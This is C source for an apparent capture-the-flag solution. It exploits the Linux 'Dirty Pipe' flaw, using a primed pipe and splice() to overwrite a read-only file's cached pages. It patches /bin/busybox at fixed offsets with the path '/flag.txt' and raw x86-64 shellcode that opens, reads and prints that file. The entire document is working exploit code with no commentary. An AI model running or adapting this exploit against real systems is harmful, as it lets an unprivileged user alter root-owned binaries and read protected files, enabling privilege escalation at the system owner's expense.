#define _GNU_SOURCE
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/user.h>

#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif

static void prepare_pipe(int p[2]) {
	if (pipe(p)) abort();

	const unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);
	static char buffer[4096];

	for (unsigned r = pipe_size; r > 0;) {
		unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
		write(p[1], buffer, n);
		r -= n;
	}

	for (unsigned r = pipe_size; r > 0;) {
		unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
		read(p[0], buffer, n);
		r -= n;
	}
}

static int pipe_write(int fd, loff_t offset, const char *data, size_t data_size) {
	if (offset % PAGE_SIZE == 0) {
		fprintf(stderr, "Error: cannot start writing at a page boundary (offset=0x%llx)\n",
		        (unsigned long long)offset);
		return -1;
	}

	const loff_t next_page = (offset | (PAGE_SIZE - 1)) + 1;
	const loff_t end_offset = offset + (loff_t)data_size;
	if (end_offset > next_page) {
		fprintf(stderr, "Error: cannot write across a page boundary (offset=0x%llx size=%zu)\n",
		        (unsigned long long)offset, data_size);
		return -1;
	}

	struct stat st;
	if (fstat(fd, &st)) {
		perror("stat failed");
		return -1;
	}

	if (offset > st.st_size) {
		fprintf(stderr, "Error: offset 0x%llx is not inside the file\n",
		        (unsigned long long)offset);
		return -1;
	}

	if (end_offset > st.st_size) {
		fprintf(stderr, "Error: cannot enlarge the file\n");
		return -1;
	}

	int p[2];
	prepare_pipe(p);

	loff_t splice_off = offset - 1;
	ssize_t nbytes = splice(fd, &splice_off, p[1], NULL, 1, 0);
	if (nbytes < 0) {
		perror("splice failed");
		close(p[0]); close(p[1]);
		return -1;
	}
	if (nbytes == 0) {
		fprintf(stderr, "short splice\n");
		close(p[0]); close(p[1]);
		return -1;
	}

	nbytes = write(p[1], data, data_size);
	close(p[0]); close(p[1]);
	if (nbytes < 0) {
		perror("write failed");
		return -1;
	}
	if ((size_t)nbytes < data_size) {
		fprintf(stderr, "short write\n");
		return -1;
	}

	return 0;
}

int main(void) {
	const char *const path = "/bin/busybox";

	const int fd = open(path, O_RDONLY);
	if (fd < 0) {
		perror("open failed");
		return EXIT_FAILURE;
	}

	const char patch1[] = "/flag.txt"; 
	if (pipe_write(fd, 0x234c98, patch1, sizeof(patch1)) != 0)
		return EXIT_FAILURE;
	printf("[+] patch1 done\n");

	const char patch2[] = "\x49\xC7\xC0\xBE\x14\x52\x00\x41\xFF\xD0";
	if (pipe_write(fd, 0x8bf90, patch2, sizeof(patch2) - 1) != 0)
		return EXIT_FAILURE;
	printf("[+] patch2 done\n");

	const char patch3[] =
		"\x48\xC7\xC0\x01\x01\x00\x00"
		"\x48\xC7\xC7\x9C\xFF\xFF\xFF"
		"\x48\xC7\xC6\x98\x4C\x63\x00"
		"\x48\x31\xD2"
		"\x4D\x31\xD2"
		"\x0F\x05"
		"\x48\x89\xC7"
		"\x48\xC7\xC6\x00\xAC\x65\x00"
		"\x48\xC7\xC2\x00\x04\x00\x00"
		"\x48\xC7\xC0\x00\x00\x00\x00"
		"\x0F\x05"
		"\x48\x89\xC2"
		"\x48\xC7\xC6\x00\xAC\x65\x00"
		"\x48\xC7\xC7\x01\x00\x00\x00"
		"\x48\xC7\xC0\x01\x00\x00\x00"
		"\x0F\x05"
		"\x48\x31\xFF"
		"\x48\xC7\xC0\x3C\x00\x00\x00"
		"\x0F\x05";  

	if (pipe_write(fd, 0x1214be, patch3, 66) != 0)
		return EXIT_FAILURE;
	printf("[+] patch3a done\n");

	if (pipe_write(fd, 0x121500, patch3 + 66, 27) != 0)
		return EXIT_FAILURE;
	printf("[+] patch3b done\n");

	close(fd);
	printf("[+] All patches applied!\n");
	return EXIT_SUCCESS;
}
